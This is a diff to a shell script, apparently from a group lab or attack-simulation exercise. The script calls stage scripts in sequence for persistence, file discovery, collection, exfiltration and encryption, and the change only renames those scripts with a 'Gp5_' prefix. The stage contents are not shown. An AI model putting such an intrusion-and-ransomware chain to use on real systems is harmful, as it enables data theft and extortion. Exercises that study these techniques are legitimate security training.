@@ -9,21 +9,21 @@ echo "[+] Check dependencies for encryption"
 pip3 install -r ./requirements.txt
 echo "[+] Starting persistence..."
 # Start Persistence
-./persistence1.sh
+./Gp5_persistence1.sh
 echo "[+] Persistence ended, do vagrant up --provision once everything is done..."
 echo "[+] Starting file discovery..."
 # Start File discovery
-./file_and_dir_discovery.sh
+./Gp5_file_and_dir_discovery.sh
 echo "[+] File discovery ended..."
 echo "[+] Starting collection..."
 # Start Collection
-./collectiontarget.sh
+./Gp5_collectiontarget.sh
 echo "[+] Collection ended..."
 echo "[+] Starting exfiltration..."
 # Start Exfiltration
-./exfiltration_target.sh
+./Gp5_exfiltration_target.sh
 echo "[+] Exfiltration ended..."
 echo "[+] Starting encryption..."
 # Start Encryption
-python3 encrypt.py fndd-stripped.txt
+python3 Gp5_encrypt.py fndd-stripped.txt
 echo "[+] Encryption ended..."
